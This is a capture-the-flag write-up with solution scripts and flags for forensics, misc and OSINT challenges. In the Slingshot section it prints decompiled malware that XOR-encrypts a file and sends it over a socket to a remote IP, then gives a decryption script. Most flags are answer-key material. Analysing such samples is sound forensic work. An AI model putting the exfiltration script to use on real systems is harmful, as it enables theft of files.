## FORENSICS

### Bad Blood
```py
from pwn import *

while True:
    io = remote("chal.pctf.competitivecyber.club", 10001)

    solutions = [
        b"Invoke-P0wnedshell.ps1",
        b"Invoke-UrbanBishop.ps1",
        b"WinRM",
        b"Covenant"
    ]
    for solution in solutions:
        io.sendlineafter(b">> ", solution)

    io.interactive()

    io.close()
```

**pctf{3v3nt_l0gs_reve4l_al1_a981eb}**



## Slingshot

Exporting files from all packets in Wireshark will result in many files called %, etc and one called download.pyc
This file can be decompiled to python using [PyLingual](https://pylingual.io/view_chimera?identifier=b8c58f248600bfa1f83337bd7bb8f6f5a64a16219e56db0e3a2257ca23afc623):

```py
# Source timestamp: 2024-09-17 17:47:38 UTC (1726595258)
import sys
import socket
import time
import math

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
file = sys.argv[1]
ip = sys.argv[2]
port = 22993

with open(file, 'rb') as r:
    data_bytes = r.read()

current_time = time.time()
current_time = math.floor(current_time)
key_bytes = str(current_time).encode('utf-8')
init_key_len = len(key_bytes)
data_bytes_len = len(data_bytes)
temp1 = data_bytes_len // init_key_len
temp2 = data_bytes_len % init_key_len
key_bytes *= temp1
key_bytes += key_bytes[:temp2]
encrypt_bytes = bytes((a ^ b for a, b in zip(key_bytes, data_bytes)))

s.connect((ip, port))
s.send(encrypt_bytes)
```

The program connects to some ip using port `22993`. Follow the TCP stream for traffic at this port in Wireshark to get the output from the python program. The python program can now be reversed with ChatGPT to get the original file.
There is only one problem. The timestamp for when the program was run is needed to decrypt the message. What we have so far is the timestamp for when the file was created.

To get the correct timestamp first try the timestamp `1726595769` and look at the output. The output is very close to correct, but there are some wierd artifacts. We just need to adjust one number at the time until the words of the file are readably correct. We end up with the timestamp `1726595769`:

```py
import socket

# Open file
with open("dump2.bin", 'rb') as f:
    encrypted_bytes = f.read()

# Timestamp
key_bytes = "1726595769".encode('utf-8')
init_key_len = len(key_bytes)
data_bytes_len = len(encrypted_bytes)
temp1 = data_bytes_len // init_key_len
temp2 = data_bytes_len % init_key_len
key_bytes *= temp1
key_bytes += key_bytes[:temp2]

# Decrypt using XOR
decrypted_bytes = bytes((a ^ b for a, b in zip(key_bytes, encrypted_bytes)))

# Optionally, save the decrypted data to a file
with open("flag.png", 'wb') as f:
    f.write(decrypted_bytes)
```

This creates an image with the flag printed on to it-.

**PCTF{1f_y0o_41n7_f1r57_y0ur3_l457}**



## MISC

### Emoji Stack

To avoid making it too complivated I desided to try to translate it to Brainfuck. This python script convert the emojies to Brainfuck syntax. Then I ran it in this online [Brainfuck interpreter](https://sange.fi/esoteric/brainfuck/impl/interp/i.html).

```py
code = "👉👉👉👉👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👉🔁08👍🔁34👈👈👈👈👈👈👈👈👈👈👍🔁48👉🔁15👍🔁5e👈🔁07👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👉🔁02👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👍🔁42👉🔁02👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👉🔁17👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👈🔁14👍🔁20👉🔁06👍🔁51👉🔁0c👍🔁34👉👉👍🔁46👈🔁14👍🔁4d👈🔁01👍🔁51👉🔁04👍🔁20👉🔁03👍🔁2f👉👉👉👉👉👉👉👉👍🔁4d👈🔁17👍🔁42👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👍🔁7c👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👉🔁0c👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👉👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👈👈👈👈👈👈👈👈👈👈👈👈👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👉🔁0c👍🔁32👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👉🔁04👍🔁5e👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👍🔁47👈🔁0f👍🔁46👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👈🔁03👍🔁20👈🔁08👍🔁5e👉🔁10👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👈🔁1d👍🔁40👉🔁10👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👍👉👉👉👉👍🔁5e👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈👈💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬👉💬"

code = code.replace("👉", ">")
code = code.replace("👈", "<")
code = code.replace("👍", "+")
code = code.replace("👍", "+")
code = code.replace("💬", ".")

while True:
    try:
        index = code.find("🔁")
        symbol = code[index-1]
        count = int(code[index+1:index+3],16)
        code = code[:index] + symbol*count + code[index+3:]
        print(count)
    except ValueError:
        break
print(code)
```

**CACI{TUR!NG_!5_R011!NG_!N_H!5_GR@V3}**


### Making Baking Pancakes

```
Welcome to the pancake shop!
Pancakes have layers, we need you to get through them all to get our secret pancake mix formula.
This server will require you to complete 1000 challenge-responses.
A response can be created by doing the following:
1. Base64 decoding the challenge once (will output (encoded|n))
2. Decoding the challenge n more times.
3. Send (decoded|current challenge iteration)
Example response for challenge 485/1000: e9208047e544312e6eac685e4e1f7e20|485
Good luck!
```

```py
from pwn import *

io = remote("chal.pctf.competitivecyber.club", 9001)

for i in range(1000):
    # Read challenge
    io.recvuntil(b"Challenge: ")
    challenge = b64d(io.recvline())
    challenge = challenge.split(b"|")
    
    # Read challenge number
    io.recvuntil(b"(")
    chall_num = io.recvuntil(b"/", drop=True)
    
    # Decrypt n times
    for n in range(int(challenge[1])):
        challenge[0] = b64d(challenge[0]).decode("utf-8")

    # Concat answer
    answer = (challenge[0] + "|" + str(int(chall_num))).encode('utf-8')
    print(answer)

    # Send answer
    io.sendlineafter(b">>", answer)

io.interactive()
```

**pctf{store_bought_pancake_batter_fa82370}**


## OSINT

### Night School

As the name inplies it should be a School and it should be in Fairfax. Therefor the search query was `George Mason University statues three`.

**PCTF{Communitas}**